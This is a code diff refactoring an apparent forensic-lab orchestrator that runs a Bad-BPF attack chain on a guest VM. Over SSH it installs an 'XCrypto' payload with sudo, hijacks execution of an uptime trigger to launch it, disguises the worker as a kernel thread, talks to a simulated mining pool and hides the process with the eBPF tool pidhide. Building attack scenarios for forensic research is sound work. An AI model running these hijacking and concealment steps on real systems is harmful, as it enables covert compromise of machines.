@@ -7,11 +7,12 @@ from collections.abc import Callable
 from pathlib import Path
 
 import yaml
+from paramiko import SSHException
 
 from orchestrator.core import console
 from orchestrator.core.provenance import file_sha256
-from orchestrator.core.ssh_client import SSHClient, SSHTerminal
-from scenarios.command_log import record_operation, run_logged_command
+from orchestrator.core.ssh_client import SSHClient
+from scenarios.command_log import CommandLog, ScenarioClaim
 
 SCENARIO_ID = "kernel_ebpf_badbpf"
 ROOT = Path(__file__).resolve().parent
@@ -41,6 +42,74 @@ MASQUERADE_NAME = "kworker/u8:2"
 POOL_HOST = "192.168.100.1"
 POOL_PORT = 3333
 POOL_TIMEOUT = 15
+
+
+def get_scenario_claims() -> list[ScenarioClaim]:
+    """Declare expected effects from successful scenario execution."""
+    return [
+        {
+            "id": "payload_installed",
+            "statement": "The prepared XCrypto payload was installed at /a.",
+            "basis": [
+                "command_log.jsonl#upload_xcrypto",
+                "command_log.jsonl#install_xcrypto",
+                "inputs/badbpf/xcrypto",
+            ],
+            "basis_type": "successful_execution_and_scenario_fact",
+            "validation_limit": "Installation completion does not independently verify final guest bytes or their persistence until acquisition.",
+        },
+        {
+            "id": "execution_hijacked",
+            "statement": "The uptime trigger launched XCrypto, confirmed by the hijack log and /proc executable link.",
+            "basis": [
+                "command_log.jsonl#trigger_hijack",
+                "command_log.jsonl#read_exechijack_log",
+                "command_log.jsonl#validate_execution_hijack",
+                "command_log.jsonl#resolve_worker_executable",
+            ],
+            "basis_type": "successful_commands",
+            "validation_limit": "The existing scenario checks precede acquisition and do not establish the complete lifetime of the hijack.",
+        },
+        {
+            "id": "worker_masqueraded",
+            "statement": "The worker used the uptime argv0 and kworker/u8:2 comm.",
+            "basis": [
+                "command_log.jsonl#read_worker_identity",
+                "command_log.jsonl#validate_execution_hijack",
+            ],
+            "basis_type": "successful_commands",
+            "validation_limit": "These are observed process labels, not kernel-worker identity.",
+        },
+        {
+            "id": "simulated_pool_exchange",
+            "statement": "The worker exchanged the expected messages with the controlled simulated pool.",
+            "basis": ["command_log.jsonl#validate_xcrypto_pool"],
+            "basis_type": "successful_command",
+            "validation_limit": "This is a simulated pool exchange, not actual mining or a backdoor.",
+        },
+        {
+            "id": "worker_hidden",
+            "statement": "The worker disappeared from the tested /proc listing after pidhide started.",
+            "basis": [
+                "command_log.jsonl#list_worker_before",
+                "command_log.jsonl#list_worker_after",
+                "command_log.jsonl#validate_worker_concealment",
+            ],
+            "basis_type": "successful_commands",
+            "validation_limit": "Limited to the tested enumeration.",
+        },
+        {
+            "id": "hidden_worker_accessible",
+            "statement": "The hidden worker and pidhide passed liveness checks, and direct worker status access returned data.",
+            "basis": [
+                "command_log.jsonl#check_worker_and_pidhide_alive",
+                "command_log.jsonl#read_hidden_worker_status",
+                "command_log.jsonl#validate_worker_concealment",
+            ],
+            "basis_type": "successful_commands",
+            "validation_limit": "Observed before capture; continued execution throughout capture is not independently checked.",
+        },
+    ]
 
 
 def verify_source() -> dict:
@@ -132,18 +201,17 @@ def run_badbpf(
 
     transcript_path.touch()
     terminal = ssh.open_terminal()
+    log = CommandLog(terminal, command_log_path)
     try:
         with terminal:
-            _stage_artifacts(ssh, terminal, command_log_path, artifact_paths)
-            guest_kernel = _preflight(terminal, command_log_path, build_record)
-            worker_pid, worker_uid, worker_comm = _start_xcrypto(
-                terminal, command_log_path
-            )
+            _stage_artifacts(ssh, log, artifact_paths)
+            _preflight(log, build_record)
+            worker_pid, worker_uid, worker_comm = _start_xcrypto(log)
             pool_marker, pool_reply, pool_connection, pool_facts = (
                 _accept_pool_connection(listener)
             )
-            record_operation(command_log_path, "validate_xcrypto_pool")
-            pidhide_pid = _hide_worker(terminal, command_log_path, worker_pid)
+            log.note("validate_xcrypto_pool")
+            pidhide_pid = _hide_worker(log, worker_pid)
     except BaseException:
         if pool_connection is not None:
             pool_connection.close()
@@ -153,9 +221,6 @@ def run_badbpf(
         transcript_path.write_text(terminal.transcript, encoding="utf-8")
 
     return {
-        "guest_kernel_release": guest_kernel,
-        "xcrypto_path": XCRYPTO_PATH,
-        "trigger_path": TRIGGER_PATH,
         "worker_pid": int(worker_pid),
         "worker_uid": int(worker_uid),
         "worker_comm": worker_comm,
@@ -163,131 +228,118 @@ def run_badbpf(
         "simulated_pool_marker": pool_marker,
         "simulated_pool_reply": pool_reply,
         "simulated_pool_connection": pool_facts,
-        "pool_connection_open_at_scenario_completion": True,
-        "networking_used": True,
-        "backdoor_c2_used": False,
-        "persistence_used": False,
     }, pool_connection.close
 
 
 def _stage_artifacts(
     ssh: SSHClient,
-    terminal: SSHTerminal,
-    command_log_path: Path,
+    log: CommandLog,
     artifact_paths: tuple[Path, ...],
 ) -> None:
     console.scope("HOST", "stage Bad-BPF and XCrypto")
     ssh.run_checked(f"mkdir -p {REMOTE_ROOT}")
+    log.note("create_staging_directory")
     for name, artifact in zip(ARTIFACT_NAMES, artifact_paths, strict=True):
         try:
             ssh.put(artifact, f"{REMOTE_ROOT}/{name}")
-        except Exception as exc:
-            record_operation(command_log_path, f"upload_{name}", error=str(exc))
+        except (OSError, RuntimeError, SSHException) as exc:
+            log.note(f"upload_{name}", error=str(exc))
             raise
-        record_operation(command_log_path, f"upload_{name}")
-    run_logged_command(
-        terminal,
-        command_log_path,
+        log.note(f"upload_{name}")
+    log.run(
+        "make_artifacts_executable",
         f"chmod +x {REMOTE_PIDHIDE} {REMOTE_EXECHIJACK} {REMOTE_XCRYPTO}",
         timeout=30,
     )
 
 
-def _preflight(
-    terminal: SSHTerminal, command_log_path: Path, build_record: dict
-) -> str:
+def _preflight(log: CommandLog, build_record: dict) -> str:
     console.scope("GUEST", "preflight checks")
-    guest_kernel = run_logged_command(
-        terminal, command_log_path, "uname -r", timeout=30
+    guest_kernel = log.run(
+        "guest_kernel", "uname -r", timeout=30
     ).combined_output.strip()
     expected_kernel = build_record.get("target", {}).get("kernel")
     if expected_kernel and guest_kernel != expected_kernel:
         raise RuntimeError(
             f"bad-bpf was built for kernel {expected_kernel}, guest runs {guest_kernel}"
         )
-    run_logged_command(
-        terminal,
-        command_log_path,
-        "test -r /sys/kernel/btf/vmlinux || "
-        "{ echo 'BTF not available' >&2; exit 1; }",
+    log.run(
+        "check_btf",
+        "test -r /sys/kernel/btf/vmlinux || { echo 'BTF not available' >&2; exit 1; }",
         timeout=30,
     )
     return guest_kernel
 
 
-def _start_xcrypto(
-    terminal: SSHTerminal, command_log_path: Path
-) -> tuple[str, str, str]:
+def _start_xcrypto(log: CommandLog) -> tuple[str, str, str]:
     console.scope("GUEST", "hijack routine execution to XCrypto")
-    run_logged_command(
-        terminal,
-        command_log_path,
+    log.run(
+        "install_xcrypto",
         f"sudo -n install -m 0755 {REMOTE_XCRYPTO} {XCRYPTO_PATH}",
         timeout=15,
     )
-    exechijack_pid = run_logged_command(
-        terminal,
-        command_log_path,
-        f"sudo -n stdbuf -oL -eL {REMOTE_EXECHIJACK} --target-ppid $$ "
-        f"> {EXECHIJACK_LOG} 2>&1 & echo $!",
-        timeout=15,
-    ).combined_output.splitlines()[-1].strip()
+    exechijack_pid = (
+        log.run(
+            "start_exechijack",
+            f"sudo -n stdbuf -oL -eL {REMOTE_EXECHIJACK} --target-ppid $$ "
+            f"> {EXECHIJACK_LOG} 2>&1 & echo $!",
+            timeout=15,
+        )
+        .combined_output.splitlines()[-1]
+        .strip()
+    )
     exechijack_pid = str(int(exechijack_pid))
 
-    run_logged_command(
-        terminal,
-        command_log_path,
+    log.run(
+        "wait_for_exechijack",
         "_s=$SECONDS; while (( SECONDS - _s < 3 )); do :; done",
         timeout=10,
     )
-    alive = run_logged_command(
-        terminal,
-        command_log_path,
+    alive = log.run(
+        "check_exechijack_alive",
         f"kill -0 {exechijack_pid} 2>/dev/null && echo ALIVE || echo DEAD",
         timeout=10,
     ).combined_output.strip()
     if alive != "ALIVE":
-        exechijack_log = run_logged_command(
-            terminal, command_log_path, f"cat {EXECHIJACK_LOG}", timeout=15
+        exechijack_log = log.run(
+            "read_failed_exechijack_log", f"cat {EXECHIJACK_LOG}", timeout=15
         ).combined_output.strip()
         raise RuntimeError(f"exechijack died before trigger: {exechijack_log!r}")
 
-    worker_pid = run_logged_command(
-        terminal,
-        command_log_path,
-        f"{TRIGGER_PATH} </dev/null >/dev/null 2>&1 & echo $!",
-        timeout=15,
-    ).combined_output.splitlines()[-1].strip()
+    worker_pid = (
+        log.run(
+            "trigger_hijack",
+            f"{TRIGGER_PATH} </dev/null >/dev/null 2>&1 & echo $!",
+            timeout=15,
+        )
+        .combined_output.splitlines()[-1]
+        .strip()
+    )
     worker_pid = str(int(worker_pid))
-    run_logged_command(terminal, command_log_path, "disown %%", timeout=10)
-    run_logged_command(
-        terminal,
-        command_log_path,
+    log.run("disown_worker", "disown %%", timeout=10)
+    log.run(
+        "wait_for_worker",
         "_s=$SECONDS; while (( SECONDS - _s < 1 )); do :; done",
         timeout=10,
     )
-    run_logged_command(
-        terminal,
-        command_log_path,
-        f"kill {exechijack_pid} 2>/dev/null; "
-        f"wait {exechijack_pid} 2>/dev/null || true",
+    log.run(
+        "stop_exechijack",
+        f"kill {exechijack_pid} 2>/dev/null; wait {exechijack_pid} 2>/dev/null || true",
         timeout=10,
     )
-    exechijack_log = run_logged_command(
-        terminal,
-        command_log_path,
+    exechijack_log = log.run(
+        "read_exechijack_log",
         f"cat {EXECHIJACK_LOG}",
         timeout=15,
     ).combined_output.strip()
-    worker_identity = run_logged_command(
-        terminal,
-        command_log_path,
+    worker_identity = log.run(
+        "read_worker_identity",
         f"while read -r key value rest; do "
         f"[[ $key == Uid: ]] && printf '%s ' \"$value\" && break; "
         f"done < /proc/{worker_pid}/status; "
         f"IFS= read -r -d '' argv0 < /proc/{worker_pid}/cmdline || true; "
         f"read -r comm < /proc/{worker_pid}/comm; "
-        f"printf '%s | %s\\n' \"$argv0\" \"$comm\"",
+        f'printf \'%s | %s\\n\' "$argv0" "$comm"',
         timeout=15,
     ).combined_output.strip()
 
@@ -303,6 +355,7 @@ def _start_xcrypto(
             f"XCrypto execution hijack failed: {worker_identity!r}; "
             f"log: {exechijack_log!r}"
         )
+    log.note("validate_execution_hijack")
     return worker_pid, fields[0], fields[3]
 
 
@@ -353,22 +406,18 @@ def _accept_pool_connection(
         raise
 
 
-def _hide_worker(
-    terminal: SSHTerminal, command_log_path: Path, worker_pid: str
-) -> str:
+def _hide_worker(log: CommandLog, worker_pid: str) -> str:
     console.scope("GUEST", "hide the connected XCrypto worker")
-    visible = run_logged_command(
-        terminal,
-        command_log_path,
+    visible = log.run(
+        "list_worker_before",
         f"ls /proc | grep -x '{worker_pid}' && echo VISIBLE || echo MISSING",
         timeout=15,
     ).combined_output
     if "VISIBLE" not in visible:
         raise RuntimeError(f"XCrypto worker {worker_pid} was not visible before hiding")
 
-    executable = run_logged_command(
-        terminal,
-        command_log_path,
+    executable = log.run(
+        "resolve_worker_executable",
         f"readlink /proc/{worker_pid}/exe",
         timeout=15,
     ).combined_output.strip()
@@ -377,39 +426,38 @@ def _hide_worker(
             f"XCrypto worker executable is {executable!r}, expected {XCRYPTO_PATH!r}"
         )
 
-    pidhide_pid = run_logged_command(
-        terminal,
-        command_log_path,
-        f"sudo -n nohup stdbuf -oL -eL {REMOTE_PIDHIDE} "
-        f"--pid-to-hide {worker_pid} </dev/null > {PIDHIDE_LOG} 2>&1 & echo $!",
-        timeout=15,
-    ).combined_output.splitlines()[-1].strip()
+    pidhide_pid = (
+        log.run(
+            "start_pidhide",
+            f"sudo -n nohup stdbuf -oL -eL {REMOTE_PIDHIDE} "
+            f"--pid-to-hide {worker_pid} </dev/null > {PIDHIDE_LOG} 2>&1 & echo $!",
+            timeout=15,
+        )
+        .combined_output.splitlines()[-1]
+        .strip()
+    )
     pidhide_pid = str(int(pidhide_pid))
-    run_logged_command(terminal, command_log_path, "disown %%", timeout=10)
-    run_logged_command(terminal, command_log_path, "sleep 2", timeout=10)
+    log.run("disown_pidhide", "disown %%", timeout=10)
+    log.run("wait_for_pidhide", "sleep 2", timeout=10)
 
-    alive = run_logged_command(
-        terminal,
-        command_log_path,
+    alive = log.run(
+        "check_worker_and_pidhide_alive",
         f"kill -0 {worker_pid} 2>/dev/null && "
         f"kill -0 {pidhide_pid} 2>/dev/null && echo ALIVE || echo DEAD",
         timeout=10,
     ).combined_output.strip()
-    hidden = run_logged_command(
-        terminal,
-        command_log_path,
+    hidden = log.run(
+        "list_worker_after",
         f"ls /proc | grep -x '{worker_pid}' && echo VISIBLE || echo HIDDEN",
         timeout=15,
     ).combined_output.strip()
-    direct_status = run_logged_command(
-        terminal,
-        command_log_path,
+    direct_status = log.run(
+        "read_hidden_worker_status",
         f"sed -n '1,2p' /proc/{worker_pid}/status",
         timeout=15,
     ).combined_output.strip()
-    run_logged_command(
-        terminal,
-        command_log_path,
+    log.run(
+        "read_pidhide_log",
         f"tail -5 {PIDHIDE_LOG} 2>/dev/null || true",
         timeout=15,
     )
@@ -418,4 +466,5 @@ def _hide_worker(
             f"XCrypto concealment failed: alive={alive!r}, hidden={hidden!r}, "
             f"status={direct_status!r}"
         )
+    log.note("validate_worker_concealment")
     return pidhide_pid
